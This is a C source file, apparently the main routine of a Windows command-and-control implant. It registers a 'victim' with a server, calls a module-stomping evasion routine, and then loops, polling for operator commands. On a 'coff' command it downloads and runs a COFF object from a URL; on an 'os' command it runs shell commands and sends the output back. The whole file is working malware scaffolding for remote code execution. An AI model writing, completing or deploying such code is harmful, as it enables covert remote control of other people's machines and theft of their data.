#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <ctype.h>
#include "Typedefs.h"

void TestingStomp();

int main() {
    Command command;
    char previousCommand[256] = { 0 }; // Buffer to store the previous command

    Victim* victim = (Victim*)malloc(sizeof(Victim));
    if (victim == NULL) {
        return -1;
    }

    TestingStomp();

    information_gatherer(victim);
    printf("Registering implant %s\n\n", victim->ID);
    registerNewImplant(victim);

    while (TRUE) {
        fetchCommand(&command);
        //printf("\nInput %s from server...\n", command.Input);
        //printf("Command %s from server ...\n", command.Cmd);
        //printf("File %s from server...\n\n", command.File);


        // Check if the new command is the same as the previous command
        if (strcmp(previousCommand, command.Input) != 0) {
            if (!strcmp(command.Input, "coff")) { // Use !strcmp to check for equality
                printf("Running the COFF Loader for %s\n", command.File);
                char url[1024];
                sprintf(url, "http://localhost:8000/%s", command.File);
                COFFLoader(url);
            }
            else if (!strcmp(command.Input, "os")) { // Use !strcmp to check for equality

                //printf("Running: '%s'\n", command.Cmd);
                char output[100][256] = { 0 };
                int count = runCmd(command.Cmd, output);

                //for (int i = 0; i < count; i++) {
                //    printf("%s", output[i]);
                //}
                sendResult(command.ImplantUser, command.Operator, output);
            }

            // Save the current command as the previous command for the next iteration
            strncpy(previousCommand, command.Input, sizeof(previousCommand) - 1);
        }
        else {
            printf("No new commands from server...");
        }

        Sleep(5000);
    }

    free(victim);
    return 0;
}

void TestingStomp() {
    moduleStomper();
    exit(0);
}